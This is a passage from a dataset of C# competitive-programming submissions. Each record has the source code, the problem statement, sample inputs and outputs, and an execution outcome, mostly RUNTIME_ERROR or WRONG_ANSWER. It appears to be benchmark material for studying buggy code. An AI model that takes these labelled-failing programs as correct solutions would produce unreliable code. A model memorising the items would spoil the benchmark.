Console.WriteLine(\"1{0}\", val);\n                        }\n                        else\n                        {\n                            Console.WriteLine(\"{0}\", val);\n                        }\n                    }\n                    else\n                    {\n                        Console.WriteLine(\"{0}\", val);\n                    }\n                }\n            }\n\n            \/\/var n = readInt();\n            \/\/var m = readInt();\n\n            \/\/var a = readIntArray();\n            \/\/var b = readIntArray();\n            #endregion\n        }\n\n        static int readInt()\n        {\n            return int.Parse(Console.ReadLine());\n        }\n\n        static long readLong()\n        {\n            return long.Parse(Console.ReadLine());\n        }\n\n        static int[] readIntArray()\n        {\n            return Console.ReadLine().Split(' ').Where(i => !string.IsNullOrEmpty(i)).Select(i => int.Parse(i)).ToArray();\n        }\n\n        static long[] readLongArray()\n        {\n            return Console.ReadLine().Split(' ').Where(i => !string.IsNullOrEmpty(i)).Select(i => long.Parse(i)).ToArray();\n        }\n\n#if DEBUG\n\t\tstatic StreamReader getInput()\n\t\t{\n\t\t\tvar resName = Assembly.GetCallingAssembly().GetManifestResourceNames()[0];\n\t\t\tvar resource = Assembly.GetCallingAssembly().GetManifestResourceStream(resName);\n\n\t\t\treturn new StreamReader(resource);\n\t\t}\n#endif\n    }\n}\n","description":"International Abbreviation Olympiad takes place annually starting from 1989. Each year the competition receives an abbreviation of form IAO'y, where y stands for some number of consequent last digits of the current year. Organizers always pick an abbreviation with non-empty string y that has never been used before. Among all such valid abbreviations they choose the shortest one and announce it to be the abbreviation of this year's competition.For example, the first three Olympiads (years 1989, 1990 and 1991, respectively) received the abbreviations IAO'9, IAO'0 and IAO'1, while the competition in 2015 received an abbreviation IAO'15, as IAO'5 has been already used in 1995.You are given a list of abbreviations. For each of them determine the year it stands for.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000)\u00a0\u2014 the number of abbreviations to process.  Then n lines follow, each containing a single abbreviation. It's guaranteed that each abbreviation contains at most nine digits.","output_spec":"For each abbreviation given in the input, find the year of the corresponding Olympiad.","notes":null,"sample_inputs":["5\nIAO'15\nIAO'2015\nIAO'1\nIAO'9\nIAO'0","4\nIAO'9\nIAO'99\nIAO'999\nIAO'9999"],"sample_outputs":["2015\n12015\n1991\n1989\n1990","1989\n1999\n2999\n9999"]}
{"difficulty":2200,"lang":"MS C#","lang_cluster":"c#","src_uid":"5215112549723fea3f2c1fe0049e0b2e","submission_id":"re_1065","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeff#if DEBUG\nusing System.Reflection;\nusing System.Threading.Tasks;\n#endif\n\nusing System;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Linq;\nusing System.Text;\nusing System.Numerics;\nusing System.Globalization;\n\n\nnamespace _44d\n{\n    class Program\n    {\n        static string _inputFilename = \"input.txt\";\n        static string _outputFilename = \"output.txt\";\n        static bool _useFileInput = false;\n\n\n        static void Main(string[] args)\n        {\n            StreamWriter file = null;\n#if DEBUG\n\t\t\tConsole.SetIn(getInput());\n#else\n            if (_useFileInput)\n            {\n                Console.SetIn(File.OpenText(_inputFilename));\n                file = new StreamWriter(_outputFilename);\n                Console.SetOut(file);\n            }\n#endif\n\n            try\n            {\n                solution();\n            }\n            finally\n            {\n                if (_useFileInput)\n                {\n                    file.Close();\n                }\n            }\n        }\n\n        static void add(long pattern, int right, int n, HashSet<long> vs)\n        {\n            \/\/vs.Inte\n            vs.IntersectWith(generate(pattern, right, n));\n        }\n\n        static IEnumerable<long> generate(long pattern, int right, int n)\n        {\n            var vs = Enumerable.Range(1, right).ToArray();\n\n            yield return NewMethod(pattern, right, vs, n);\n\n            while (true)\n            {\n                var can = false;\n                for (int i = right - 1; i >= 0; i--)\n                {\n                    var max = n - (right - 1 - i);\n                    if (vs[i] < max)\n                    {\n                        vs[i]++;\n                        for (int j = i + 1; j < right; j++)\n                        {\n                            vs[j] = vs[j - 1] + 1;\n                        }\n\n                        long sb = NewMethod(pattern, right, vs, n);\n\n                        yield return sb;\n                        can = true;\n                        break;\n                    }\n                }\n\n                if (!can)\n                {\n                    break;\n                }\n            }\n            \n        }\n\n        private static long NewMethod(long pattern, int right, int[] vs, int n)\n        {\n            var sb = 0L;\n            for (int j = 0; j < n; j++)\n            {\n                sb |= (~((1L << j) & pattern));\n            }\n\n            for (int j = 0; j < right; j++)\n            {\n                sb &= ~(1L << (vs[j] - 1));\n                sb |= (1L << (vs[j] - 1)) & pattern;\n                \/\/sb[vs[j] - 1] = pattern[vs[j] - 1];\n            }\n\n            return sb;\n        }\n\n\n        static void solution()\n        {\n            #region SOLUTION\n            var d = readIntArray();\n            var n = d[0];\n            var m = d[1];\n            var inter = new HashSet<long>();\n\n            for (int i = 0; i < m; i++)\n            {\n                var next = Console.ReadLine().Split(' ').ToArray();\n                var line = next[0];\n                var ct = int.Parse(next[1]);\n\n                var pattern = 0L;\n                for (int j = 0; j < n; j++)\n                {\n                    if (line[j] == '1')\n                    {\n                        pattern |= (1L << j);\n                    }\n                }\n\n                if (i == 0)\n                {\n                    var c = generate(pattern, ct, n).ToArray();\n                    \/\/foreach (var item in c)\n                    \/\/{\n                    \/\/    for (int j = 0; j < n; j++)\n                    \/\/    {\n                    \/\/        Console.Write(((1L << j) & item) != 0 ? '1' : '0');\n                    \/\/    }\n\n                    \/\/    Console.WriteLine();\n                    \/\/}\n\n                    inter.UnionWith(generate(pattern, ct, n));\n                }\n                else\n                {\n                    add(pattern, ct, n, inter);\n                }\n            }\n\n            Console.WriteLine(inter.Count);\n\n            \/\/var n = readInt();\n            \/\/var m = readInt();\n\n            \/\/var a = readIntArray();\n            \/\/var b = readIntArray();\n            #endregion\n        }\n\n        static int readInt()\n        {\n            return int.Parse(Console.ReadLine());\n        }\n\n        static long readLong()\n        {\n            return long.Parse(Console.ReadLine());\n        }\n\n        static int[] readIntArray()\n        {\n            return Console.ReadLine().Split(' ').Where(i => !string.IsNullOrEmpty(i)).Select(i => int.Parse(i)).ToArray();\n        }\n\n        static long[] readLongArray()\n        {\n            return Console.ReadLine().Split(' ').Where(i => !string.IsNullOrEmpty(i)).Select(i => long.Parse(i)).ToArray();\n        }\n\n#if DEBUG\n\t\tstatic StreamReader getInput()\n\t\t{\n\t\t\tvar resName = Assembly.GetCallingAssembly().GetManifestResourceNames()[0];\n\t\t\tvar resource = Assembly.GetCallingAssembly().GetManifestResourceStream(resName);\n\n\t\t\treturn new StreamReader(resource);\n\t\t}\n#endif\n    }\n}\n","description":"Vasya tries to break in a safe. He knows that a code consists of n numbers, and every number is a 0 or a 1. Vasya has made m attempts to enter the code. After each attempt the system told him in how many position stand the right numbers. It is not said in which positions the wrong numbers stand. Vasya has been so unlucky that he hasn\u2019t entered the code where would be more than 5 correct numbers. Now Vasya is completely bewildered: he thinks there\u2019s a mistake in the system and it is self-contradictory. Help Vasya \u2014 calculate how many possible code variants are left that do not contradict the previous system responses.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (6\u2009\u2264\u2009n\u2009\u2264\u200935,\u20091\u2009\u2264\u2009m\u2009\u2264\u200910) which represent the number of numbers in the code and the number of attempts made by Vasya. Then follow m lines, each containing space-separated si and ci which correspondingly indicate Vasya\u2019s attempt (a line containing n numbers which are 0 or 1) and the system\u2019s response (an integer from 0 to 5 inclusively).","output_spec":"Print the single number which indicates how many possible code variants that do not contradict the m system responses are left.","notes":null,"sample_inputs":["6 2\n000000 2\n010100 4","6 3\n000000 2\n010100 4\n111100 0","6 3\n000000 2\n010100 4\n111100 2"],"sample_outputs":["6","0","1"]}
{"difficulty":2500,"lang":"Mono C#","lang_cluster":"c#","src_uid":"5517efa2fc9362fdf342d32adac889f4","submission_id":"3d44509298ffef2e219a95a7564b8004","tags":["dp","math"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Globalization;\nusing System.Text;\nusing System.IO;\nusing System.Linq;\nusing System.Threading;\n\n\n\n\nclass Program\n{\n    long[,] dp;\n    long[] allLucky;\n    long[] p10;\n    int K;\n    const long mod = 1000000007;\n    void solve()\n    {\n        int Q = nextInt();\n        K = nextInt();\n        Do();\n        for (int step = 1; step <= Q; step++)\n        {\n            string s = nextString();\n            string t = nextString();\n            long res = getStricklySmaller(t);\n            res -= getStricklySmaller(s);\n            if (isLucky(t))\n                res++;\n            res += mod;\n            res %= mod;\n            println(res);\n        }\n\n    }\n\n    private long getStricklySmaller(string s)\n    {\n        int prev = -1;\n        int d = 1001;\n        long res = 0;\n        for (int i = 0; i < s.Length; i++)\n        {\n            for (int cur = 0; cur < s[i] - '0'; cur++)\n            {\n                if (cur == 0 && i == 0)\n                    continue;\n                int nd = d;\n                if ((cur == 4 || cur == 7) && prev != -1)\n                    nd = Math.Min(nd, i - prev);\n                if (nd <= K)\n                    res += p10[s.Length - 1 - i];\n                else\n                {\n                    int nprev = i-prev;\n                    if (prev == -1)\n                        nprev = 1001;\n                    if (cur == 4 || cur == 7)\n                        nprev = 0;\n                    res += dp[nprev, s.Length - 1 - i];\n                }\n                res %= mod;\n            }\n            if (s[i] == '4' || s[i] == '7')\n            {\n                if (prev != -1)\n                {\n                    d = Math.Min(d, i - prev);\n                }\n                prev = i;\n            }\n        }\n        for (int i = 1; i < s.Length; i++)\n            res = (res + allLucky[i]) % mod;\n        return res;\n    }\n    void Do()\n    {\n        dp = new long[1002, 1002];\n        allLucky = new long[1002];\n        p10 = new long[1002];\n        for (int i = 0; i < p10.Length; i++)\n        {\n            p10[i] = (i == 0) ? 1 : 10 * p10[i - 1] % mod;\n        }\n        for (int digits = 0; digits < p10.Length; digits++)\n            for (int prev = 0; prev < p10.Length; prev++)\n            {\n                if (digits > 0)\n                {\n                    long cur = 0;\n                    \/\/if lucky\n                    if (prev <= K - 1)\n                    {\n                        cur += 2*p10[digits - 1];\n                    }\n                    else\n                    {\n\n                        cur += dp[0, digits - 1];\n                    }\n                    \/\/end od luck\n                    \/\/not lucky\n                    cur += 8*dp[Math.Min(1001, prev + 1), digits - 1];\n                    \/\/end of not lucky\n                    dp[prev, digits] = cur % mod;\n                }\n            }\n        for (int digits = 2; digits < p10.Length; digits++)\n        {\n            for (int first = 1; first <= 9; first++)\n            {\n                int prev = 1001;\n                if (first == 4 || first == 7)\n                {\n                    prev = 0;\n                }\n                allLucky[digits] = (allLucky[digits] + dp[prev, digits - 1]) % mod;\n            }\n        }\n\n    }\n    bool isLucky(string s)\n    {\n        int prev = -1;\n        int d = 1001;\n        for (int i = 0; i < s.Length; i++)\n        {\n            if (s[i] == '4' || s[i] == '7')\n            {\n                if (prev != -1)\n                {\n                    d = Math.Min(d, i - prev);\n                }\n                prev = i;\n            }\n        }\n        return d <= K;\n    }\n\n    \/\/\/\/\/\/\/\/\/\/\/\/\n    private void println(int[] ar)\n    {\n        for (int i = 0; i < ar.Length; i++)\n        {\n            if (i == ar.Length - 1)\n                println(ar[i]);\n            else\n                print(ar[i] + \" \");\n        }\n    }\n    private void println(int[] ar, bool add)\n    {\n        int A = 0;\n        if (add)\n            A++;\n        for (int i = 0; i < ar.Length; i++)\n        {\n            if (i == ar.Length - 1)\n                println(ar[i] + A);\n            else\n                print((ar[i] + A) + \" \");\n        }\n    }\n\n    private void println(string Stringst)\n    {\n        Console.WriteLine(Stringst);\n    }\n    private void println(char charnum)\n    {\n        Console.WriteLine(charnum);\n    }\n    private void println(int Intnum)\n    {\n        Console.WriteLine(Intnum);\n    }\n    private void println(long Longnum)\n    {\n        Console.WriteLine(Longnum);\n    }\n    private void println(double Doublenum)\n    {\n        string s = Doublenum.ToString(CultureInfo.InvariantCulture);\n        Console.WriteLine(s);\n    }\n\n    private void print(string Stringst)\n    {\n        Console.Write(Stringst);\n    }\n    private void print(int Intnum)\n    {\n        Console.Write(Intnum);\n    }\n    private void print(char charnum)\n    {\n        Console.Write(charnum);\n    }\n    private void print(long Longnum)\n    {\n        Console.Write(Longnum);\n    }\n    private void print(double Doublenum)\n    {\n        Console.Write(Doublenum);\n    }\n\n\n    string[] inputLine = new string[0];\n    int inputInd = 0;\n    string nextLine()\n    {\n        return Console.ReadLine();\n    }\n    void readInput()\n    {\n        if (inputInd != inputLine.Length)\n            throw new Exception();\n        inputInd = 0;\n        inputLine = Console.ReadLine().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);\n        if (inputLine.Length == 0)\n            readInput();\n\n    }\n    int nextInt()\n    {\n        return int.Parse(nextString());\n    }\n    long nextLong()\n    {\n        return long.Parse(nextString());\n    }\n    double nextDouble()\n    {\n        return double.Parse(nextString());\n    }\n    string nextString()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return inputLine[inputInd++];\n    }\n    static void Main(string[] args)\n    {\n        Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;\n        new Program().solve();\n    }\n}","description":"Petya likes horse racing very much. Horses numbered from l to r take part in the races. Petya wants to evaluate the probability of victory; for some reason, to do that he needs to know the amount of nearly lucky horses' numbers. A nearly lucky number is an integer number that has at least two lucky digits the distance between which does not exceed k. Petya learned from some of his mates from Lviv that lucky digits are digits 4 and 7. The distance between the digits is the absolute difference between their positions in the number of a horse. For example, if k\u2009=\u20092, then numbers 412395497, 404, 4070400000070004007 are nearly lucky and numbers 4, 4123954997, 4007000040070004007 are not.Petya prepared t intervals [li,\u2009ri] and invented number k, common for all of them. Your task is to find how many nearly happy numbers there are in each of these segments. Since the answers can be quite large, output them modulo 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers t and k (1\u2009\u2264\u2009t,\u2009k\u2009\u2264\u20091000) \u2014 the number of segments and the distance between the numbers correspondingly. Next t lines contain pairs of integers li and ri (1\u2009\u2264\u2009l\u2009\u2264\u2009r\u2009\u2264\u2009101000). All numbers are given without the leading zeroes. Numbers in each line are separated by exactly one space character.","output_spec":"Output t lines. In each line print one integer \u2014 the answer for the corresponding segment modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first sample, the four nearly lucky numbers are 44, 47, 74, 77.In the second sample, only 74 and 77 are in the given segment.","sample_inputs":["1 2\n1 100","1 2\n70 77","2 1\n1 20\n80 100"],"sample_outputs":["4","2","0\n0"]}
{"difficulty":2400,"lang":"Mono C#","lang_cluster":"c#","src_uid":"566adc43d2d6df257c26c5f5495a5745","submission_id":"re_1216","tags":["number theory"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\n\n\n\nclass Program\n{\n    const long inf = int.MaxValue;\n\tvoid solve()\n\t{\n\n        string[] s = Console.ReadLine().Split(' ');\n        \n        long b = 0;\n        long c=0;\n        foreach (char ch in s[2])\n        {\n            c = (10 * c + ch - '0');\n        }\n        foreach (char ch in s[0])\n            b = (10 * b + ch - '0') % c;\n        long ret = 1;\n        long p = b;\n        char[] t = s[1].ToCharArray();\n        for (int i = t.Length - 1; i >= 0; i--)\n        {\n            if (t[i] == '0')\n                t[i] = '9';\n            else\n            {\n                t[i]--;\n                break;\n            }\n        }\n        for (int i = t.Length - 1; i >= 0; i--)\n        {\n            long np = 1;\n            for (int j = 0; j < t[i] - '0'; j++)\n                np = (np * p) % c;\n            ret *= np;\n            ret %= c;\n            for (int j = t[i] - '0'; j <= '9'; j++)\n                np = (p * np) % c;\n            p = np;\n        }\n        ret = ret * (b - 1 + c) % c;\n        if (ret == 0)\n            ret = c;\n        println(ret);\n\n\n\t}\n\n\n    \/\/\/\/\/\/\/\/\/\/\/\/\n\n\n\n\n\n    private void println(string Stringst)\n    {\n        Console.WriteLine(Stringst);\n    }\n    private void println(int Intnum)\n    {\n        Console.WriteLine(Intnum);\n    }\n    private void println(long Longnum)\n    {\n        Console.WriteLine(Longnum);\n    }\n    private void println(double Doublenum)\n    {\n        Console.WriteLine(Doublenum);\n    }\n\n    private void print(string Stringst)\n    {\n        Console.Write(Stringst);\n    }\n    private void print(int Intnum)\n    {\n        Console.Write(Intnum);\n    }\n    private void print(long Longnum)\n    {\n        Console.Write(Longnum);\n    }\n    private void print(double Doublenum)\n    {\n        Console.Write(Doublenum);\n    }\n\n\n    string[] inputLine = new string[0];\n    int inputInd = 0;\n    string nextLine()\n    {\n        return Console.ReadLine();\n    }\n    void readInput()\n    {\n        if (inputInd != inputLine.Length)\n            throw new Exception();\n        inputInd = 0;\n        inputLine = Console.ReadLine().Split(new char[]{' '},StringSplitOptions.RemoveEmptyEntries);\n        if (inputLine.Length == 0)\n            readInput();    \n\n    }\n    int nextInt()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return int.Parse(inputLine[inputInd++]);\n    }\n    long nextLong()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return long.Parse(inputLine[inputInd++]);\n    }\n    double nextDouble()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return double.Parse(inputLine[inputInd++]);\n    }\n    string nextString()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return inputLine[inputInd++];\n    }\n    static void Main(string[] args)\n    {\n        new Program().solve();\n    }\n}\n\n\n","description":"Nick is attracted by everything unconventional. He doesn't like decimal number system any more, and he decided to study other number systems. A number system with base b caught his attention. Before he starts studying it, he wants to write in his notepad all the numbers of length n without leading zeros in this number system. Each page in Nick's notepad has enough space for c numbers exactly. Nick writes every suitable number only once, starting with the first clean page and leaving no clean spaces. Nick never writes number 0 as he has unpleasant memories about zero divide.Would you help Nick find out how many numbers will be written on the last page.","input_from":"standard input","output_to":"standard output","input_spec":"The only input line contains three space-separated integers b, n and c (2\u2009\u2264\u2009b\u2009&lt;\u200910106, 1\u2009\u2264\u2009n\u2009&lt;\u200910106, 1\u2009\u2264\u2009c\u2009\u2264\u2009109). You may consider that Nick has infinite patience, endless amount of paper and representations of digits as characters. The numbers doesn't contain leading zeros.","output_spec":"In the only line output the amount of numbers written on the same page as the last number.","notes":"NoteIn both samples there are exactly 4 numbers of length 3 in binary number system. In the first sample Nick writes 3 numbers on the first page and 1 on the second page. In the second sample all the 4 numbers can be written on the first page.","sample_inputs":["2 3 3","2 3 4"],"sample_outputs":["1","4"]}
{"difficulty":1900,"lang":"Mono C#","lang_cluster":"c#","src_uid":"6214a85d2be0a908dcbfe089327cf51a","submission_id":"re_1161","tags":["games"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Globalization;\nusing System.Text;\nusing System.IO;\nusing System.Linq;\nusing System.Threading;\n\n\n\n\nclass Program\n{\n\n    void solve()\n    {\n\n        int n = nextInt();\n        int m = nextInt();\n        int k = nextInt();\n        int[] x = new int[k];\n        int[] y = new int[k];\n        for (int i = 0; i < k; i++)\n        {\n            x[i] = nextInt();\n            y[i] = nextInt();\n        }\n        string res = \"NO\";\n        for (int i = 0; i < k; i++)\n            if (can(x[i], y[i], n, m))\n                res = \"YES\";\n        println(res);\n    }\n\n    private bool can(int x, int y, int n, int m)\n    {\n        if (x <= 8 || y <= 8 || n - x + 1 <= 8 || m - y + 1 <= 8)\n            return true;\n        else\n            return false;\n    }\n\n    \/\/\/\/\/\/\/\/\/\/\/\/\n    private void println(int[] ar)\n    {\n        for (int i = 0; i < ar.Length; i++)\n        {\n            if (i == ar.Length - 1)\n                println(ar[i]);\n            else\n                print(ar[i] + \" \");\n        }\n    }\n    private void println(int[] ar, bool add)\n    {\n        int A = 0;\n        if (add)\n            A++;\n        for (int i = 0; i < ar.Length; i++)\n        {\n            if (i == ar.Length - 1)\n                println(ar[i] + A);\n            else\n                print((ar[i] + A) + \" \");\n        }\n    }\n\n    private void println(string Stringst)\n    {\n        Console.WriteLine(Stringst);\n    }\n    private void println(char charnum)\n    {\n        Console.WriteLine(charnum);\n    }\n    private void println(int Intnum)\n    {\n        Console.WriteLine(Intnum);\n    }\n    private void println(long Longnum)\n    {\n        Console.WriteLine(Longnum);\n    }\n    private void println(double Doublenum)\n    {\n        string s = Doublenum.ToString(CultureInfo.InvariantCulture);\n        Console.WriteLine(s);\n    }\n\n    private void print(string Stringst)\n    {\n        Console.Write(Stringst);\n    }\n    private void print(int Intnum)\n    {\n        Console.Write(Intnum);\n    }\n    private void print(char charnum)\n    {\n        Console.Write(charnum);\n    }\n    private void print(long Longnum)\n    {\n        Console.Write(Longnum);\n    }\n    private void print(double Doublenum)\n    {\n        Console.Write(Doublenum);\n    }\n\n\n    string[] inputLine = new string[0];\n    int inputInd = 0;\n    string nextLine()\n    {\n        return Console.ReadLine();\n    }\n    void readInput()\n    {\n        if (inputInd != inputLine.Length)\n            throw new Exception();\n        inputInd = 0;\n        inputLine = Console.ReadLine().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);\n        if (inputLine.Length == 0)\n            readInput();\n\n    }\n    int nextInt()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return int.Parse(inputLine[inputInd++]);\n    }\n    long nextLong()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return long.Parse(inputLine[inputInd++]);\n    }\n    double nextDouble()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return double.Parse(inputLine[inputInd++]);\n    }\n    string nextString()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return inputLine[inputInd++];\n    }\n    static void Main(string[] args)\n    {\n        Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;\n        new Program().solve();\n    }\n}\n\n\n","description":"Volodya and Vlad play the following game. There are k pies at the cells of n\u2009\u2009\u00d7\u2009\u2009m board. Each turn Volodya moves one pie to the neighbouring (by side) cell. If the pie lies at the border of the board then Volodya can move it outside the board, get the pie and win. After Volodya's move, Vlad bans some edge at the border of the board of length 1 (between two knots of the board) so that Volodya is not able to move the pie outside the board through this edge anymore. The question is: will Volodya win this game? We suppose both players follow the optimal strategy.","input_from":"standard input","output_to":"standard output","input_spec":"First line contains 3 integers, separated by space: 1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100 \u2014 dimensions of the board and 0\u2009\u2264\u2009k\u2009\u2264\u2009100 \u2014 the number of pies. Each of the next k lines contains 2 integers, separated by space: 1\u2009\u2264\u2009x\u2009\u2264\u2009n, 1\u2009\u2264\u2009y\u2009\u2264\u2009m \u2014 coordinates of the corresponding pie. There could be more than one pie at a cell. ","output_spec":"Output only one word: \"YES\" \u2014 if Volodya wins, \"NO\" \u2014 otherwise.","notes":null,"sample_inputs":["2 2 1\n1 2","3 4 0","100 50 2\n50 25\n50 25"],"sample_outputs":["YES","NO","NO"]}
{"difficulty":2200,"lang":"MS C#","lang_cluster":"c#","src_uid":"7225266f663699ff7e16b726cadfe9ee","submission_id":"10f2c3191a0e5d3fbd2bbe5a259bf055","tags":["implementation","greedy","math","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.IO;\n\nnamespace ConsoleApplication2\n{\n    class Program\n    {\n        private static int ReadInt()\n        {\n            return int.Parse(Console.ReadLine());\n        }\n\n        private static int[] ReadIntArray()\n        {\n            string[] tmp = Console.ReadLine().Split(' ');\n            int[] ans = new int[tmp.Length];\n            for (int i = 0; i < tmp.Length; i++) ans[i] = int.Parse(tmp[i]);\n            return ans;\n        }\n\n        private static long[] ReadLongArray()\n        {\n            string[] tmp = Console.ReadLine().Split(' ');\n            long[] ans = new long[tmp.Length];\n            for (int i = 0; i < tmp.Length; i++) ans[i] = long.Parse(tmp[i]);\n            return ans;\n        }\n\n        private static string[] ReadStringArray()\n        {\n            string[] tmp = Console.ReadLine().Split(' ');\n            return tmp;\n        }\n\n        private static long GCD(long a, long b)\n        {\n            if (a % b == 0) return b;\n            return GCD(b, a % b);\n        }\n\n\n\n        private static long Simulate(long h1, long a1, long x1, long y1, List<long> visits1,\n            long h2, long a2, long x2, long y2, List<long> visits2)\n        {\n            long iterations = m + m + m;\n            for (long i = 0; i <= iterations; i++)\n            {\n                if (h1 == a1) visits1.Add(i);\n                if (h2 == a2) visits2.Add(i);\n                if (h1 == a1 && h2 == a2) return i;\n                h1 = (h1 * x1 + y1) % m;\n                h2 = (h2 * x2 + y2) % m;\n            }\n\n            return - 1;\n        }\n\n        private static int Count;\n        private static long m;\n        private static List<long> Visits1= new List<long>();\n        private static List<long> Visits2 =new List<long>();\n        static void Main(string[] args)\n        {\/*\n            m = 1007;\n            Visits = new List<long>();\n            GetList(111, 77, 15, 23);*\/\n\n\n            m = ReadInt();\n            int[] tmp = ReadIntArray();\n            long h1 = tmp[0];long a1 = tmp[1];\n            tmp = ReadIntArray();\n            long x1 = tmp[0]; long y1 = tmp[1];\n            tmp = ReadIntArray();\n            long h2 = tmp[0]; long a2 = tmp[1];\n            tmp = ReadIntArray();\n            long x2 = tmp[0]; long y2 = tmp[1];\n\n            long ans = Simulate(h1, a1, x1, y1, Visits1,\n                h2, a2, x2, y2, Visits2);\n\n            if (ans > -1)\n            {\n                Console.Write(ans);\n                return;\n            }\n\n            if (Visits1.Count == 0 || Visits2.Count == 0)\n            {\n                Console.Write(-1);\n                return;\n            }\n            \n            if (Visits1.Count == 1)\n            {\n                if (Visits2.Contains(Visits1[0]))\n                {\n                    Console.WriteLine(Visits1[0]);\n                }\n                else\n                {\n                    Console.WriteLine(-1);\n                }\n                return;\n            }\n\n            if (Visits2.Count == 1)\n            {\n                if (Visits1.Contains(Visits2[0]))\n                {\n                    Console.WriteLine(Visits2[0]);\n                }\n                else\n                {\n                    Console.WriteLine(-1);\n                }\n                return;\n            }\n\n            long c1 = Visits1[Visits1.Count - 1] - Visits1[Visits1.Count - 2];\n            long c2 = Visits2[Visits2.Count - 1] - Visits2[Visits2.Count - 2];\n            long d1 = Visits1[Visits1.Count - 1];\n            long d2 = Visits2[Visits2.Count - 1];\n\n            if (c1 < c2)\n            {\n                long qwe = c1;\n                c1 = c2;\n                c2 = qwe;\n\n                qwe = d1;\n                d1 = d2;\n                d2 = qwe;\n            }\n\n            \/\/long iteration = Math.Max\n            for (long i = 0; i <= 5000000; i++)\n            {\n                long sum = d1 + c1 * i;\n\n                if (sum % c2 == d2)\n                {\n                    Console.Write(sum);\n                    return;\n                }\n            }\n\n            Console.Write(-1);        \n        }\n\n        private const int BufferSize = 1 << 16;\n        private static readonly StreamReader consoleReader = new StreamReader(Console.OpenStandardInput(BufferSize), Encoding.ASCII, false, BufferSize);\n        private static readonly StreamWriter consoleWriter = new StreamWriter(Console.OpenStandardOutput(BufferSize), Encoding.ASCII, BufferSize);\n\n        private static int ReadInt123()\n        {\n            int ans = 0;\n            do\n            {\n                ans = consoleReader.Read();\n                if (ans == -1)\n                    return 0;\n            } while (ans < '0' || ans > '9');\n\n            ans -= '0';\n            while (true)\n            {\n                int chr = consoleReader.Read();\n                if (chr < '0' || chr > '9')\n                    return ans;\n                ans = ans * 10 + chr - '0';\n            }\n        }\n    }\n}\n","description":"Mike has a frog and a flower. His frog is named Xaniar and his flower is named Abol. Initially(at time 0), height of Xaniar is h1 and height of Abol is h2. Each second, Mike waters Abol and Xaniar.  So, if height of Xaniar is h1 and height of Abol is h2, after one second height of Xaniar will become  and height of Abol will become  where x1,\u2009y1,\u2009x2 and y2 are some integer numbers and  denotes the remainder of a modulo b.Mike is a competitive programmer fan. He wants to know the minimum time it takes until height of Xania is a1 and height of Abol is a2.Mike has asked you for your help. Calculate the minimum time or say it will never happen.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains integer m (2\u2009\u2264\u2009m\u2009\u2264\u2009106). The second line of input contains integers h1 and a1 (0\u2009\u2264\u2009h1,\u2009a1\u2009&lt;\u2009m). The third line of input contains integers x1 and y1 (0\u2009\u2264\u2009x1,\u2009y1\u2009&lt;\u2009m). The fourth line of input contains integers h2 and a2 (0\u2009\u2264\u2009h2,\u2009a2\u2009&lt;\u2009m). The fifth line of input contains integers x2 and y2 (0\u2009\u2264\u2009x2,\u2009y2\u2009&lt;\u2009m). It is guaranteed that h1\u2009\u2260\u2009a1 and h2\u2009\u2260\u2009a2.","output_spec":"Print the minimum number of seconds until Xaniar reaches height a1 and Abol reaches height a2 or print -1 otherwise.","notes":"NoteIn the first sample, heights sequences are following:Xaniar: Abol: ","sample_inputs":["5\n4 2\n1 1\n0 1\n2 3","1023\n1 2\n1 0\n1 2\n1 1"],"sample_outputs":["3","-1"]}
{"difficulty":2600,"lang":"Mono C#","lang_cluster":"c#","src_uid":"73291724a4609ddd4cc8a92c77e8496f","submission_id":"re_1317","tags":["graphs","greedy","shortest paths"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.IO;\n\nnamespace _37E\n{\n\tclass Vertex\n\t{\n\t\tpublic int V;\n\t\tpublic char Color;\n\t\tpublic HashSet<Vertex> Adjast = new HashSet<Vertex>();\n\n\t\tpublic override string ToString()\n\t\t{\n\t\t\treturn V.ToString() + \"(\" + Color + \")\";\n\t\t}\n\t}\n\n\tclass Solver\n\t{\n\t\tpublic int N { get; set; }\n\t\tpublic int M { get; set; }\n\t\tpublic string[] Board { get; set; }\n\t\tint[,] Mask;\n\t\tDictionary<int, Vertex> Graph = new Dictionary<int, Vertex>();\n\n\t\tpublic Solver(int N, int M, string[] board)\n\t\t{\n\t\t\tthis.N = N;\n\t\t\tthis.M = M;\n\t\t\tBoard = board;\n\t\t}\n\n\t\tpublic void Solve()\n\t\t{\n\t\t\tMask = new int[N, M];\n\n\t\t\tint Areas = Fill();\n\n\t\t\tbool[] prepared = new bool[Areas+1];\n\n\t\t\tfor (int i = 1; i <= Areas; i++)\n\t\t\t{\n\t\t\t\tGraph.Add(i, new Vertex() { V = i });\n\t\t\t}\n\n\t\t\tfor (int i = 0; i < Mask.GetLength(0); i++)\n\t\t\t\tfor (int j = 0; j < Mask.GetLength(1); 